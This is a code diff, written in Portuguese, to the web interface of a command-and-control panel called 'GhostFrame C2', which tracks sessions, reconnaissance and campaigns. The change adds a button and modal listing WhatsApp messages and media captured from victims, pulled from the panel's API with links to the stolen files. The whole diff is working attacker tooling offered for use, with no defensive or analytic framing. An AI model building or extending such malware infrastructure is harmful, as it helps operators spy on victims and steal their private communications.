@@ -44,8 +44,13 @@ label{display:block;font-size:11px;color:#8b949e;margin-bottom:3px;text-transfor
 </head>
 <body>
 
-<h1>🖥️ GhostFrame C2 — Painel v5</h1>
-<div class="sub">Polling REST 2s • Auto-recon • 5 campanhas</div>
+<div style="display:flex;justify-content:space-between;align-items:center;gap:12px;flex-wrap:wrap">
+  <div>
+    <h1>🖥️ GhostFrame C2 — Painel v5</h1>
+    <div class="sub">Polling REST 2s • Auto-recon • 5 campanhas</div>
+  </div>
+  <button class="btn primary" onclick="toggleWa()">💬 Capturas WhatsApp</button>
+</div>
 
 <div class="stats">
   <div class="stat"><div class="num" id="stTotal">0</div><div class="lbl">Sessões</div></div>
@@ -249,6 +254,39 @@ document.getElementById('campTabs').addEventListener('click',function(e){
 
 renderSessions();
 setInterval(renderSessions,2000);
+function toggleWa(){
+  var m=document.getElementById('waModal');
+  if(m.classList.contains('hidden')){m.classList.remove('hidden');loadWa();}
+  else{m.classList.add('hidden');}
+}
+function loadWa(){
+  var el=document.getElementById('waList');
+  el.innerHTML='Carregando...';
+  api('/api/whatsapp/messages').then(function(list){
+    if(!list||!Array.isArray(list)||!list.length){el.innerHTML='<span style="color:#8b949e">Nenhuma mensagem capturada ainda.</span>';return;}
+    var h='<table style="width:100%;border-collapse:collapse"><tr style="color:#8b949e;text-align:left"><th>De</th><th>Mensagem</th><th>Mídia</th><th>Quando</th></tr>';
+    for(var i=0;i<list.length;i++){
+      var m=list[i];
+      var media='';
+      if(m.media&&m.media.length){
+        media='<a href="/api/whatsapp/media/'+encodeURIComponent(m.dir)+'/'+encodeURIComponent(m.media[0])+'" target="_blank" style="color:#58a6ff">📎 '+m.media.length+'</a>';
+      }
+      var t=String(m.ts||'').replace('T',' ').slice(0,16);
+      h+='<tr style="border-top:1px solid #21262d"><td style="padding:6px">'+esc(m.from||m.dir)+'</td><td style="padding:6px;word-break:break-all">'+esc(m.text||'')+'</td><td style="padding:6px">'+media+'</td><td style="padding:6px;white-space:nowrap;color:#8b949e">'+esc(t)+'</td></tr>';
+    }
+    h+='</table>';
+    el.innerHTML=h;
+  }).catch(function(){el.innerHTML='<span style="color:#f85149">Falha ao carregar capturas.</span>';});
+}
 </script>
+<div id="waModal" class="hidden" style="position:fixed;inset:0;background:rgba(0,0,0,.75);z-index:99;overflow:auto">
+  <div style="max-width:680px;margin:40px auto;background:#161b22;border:1px solid #30363d;border-radius:10px;padding:16px">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px">
+      <b>💬 Capturas WhatsApp</b>
+      <button class="btn" onclick="toggleWa()">✕ Fechar</button>
+    </div>
+    <div id="waList" style="font-size:12px">Carregando...</div>
+  </div>
+</div>
 </body>
 </html>
